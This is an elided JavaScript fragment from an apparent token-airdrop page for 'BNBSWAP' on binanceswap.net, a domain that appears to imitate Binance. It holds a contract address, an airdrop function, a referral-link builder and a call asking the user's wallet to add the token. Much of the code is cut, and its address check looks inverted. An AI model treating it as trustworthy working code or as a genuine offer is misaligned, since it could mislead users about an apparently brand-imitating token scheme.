...
let addr;
const sttaddr = "0x21e236e9f1453aef36815d4292207a37fad0bf7d";
const sttabi = [{
    "constant": false,
    "inputs": [{
        "name": "_refer",
...
const getAirdrop = async () => {
    ...
    if (gettkbl == 0) {
        ...
        if (fresh === "")
            fresh = "0x21e236e9f1453aef36815d4292207a37fad0bf7d";
...
function getreflink() {
    ...
    if (!document.getElementById('refaddress').value) {
        ...
        if (!/^(0x){1}[0-9a-fA-F]{40}$/i.test(referaladd)) {
            ...
            document.getElementById('refaddress').value = 'https://binanceswap.net/?ref=' + document.getElementById('refaddress').value;
        }
    }
}
    ...
    try {
        web3.currentProvider.sendAsync({
            ...
            params: {
                'type': 'BEP 20',
                'options': {
                    'address': '0x21e236e9f1453aef36815d4292207a37fad0bf7d',
                    'symbol': 'BNBSWAP',
                    'decimals': '18',
                    'image': 'https://binanceswap.net/assets/images/safewex.png',
                },
            },
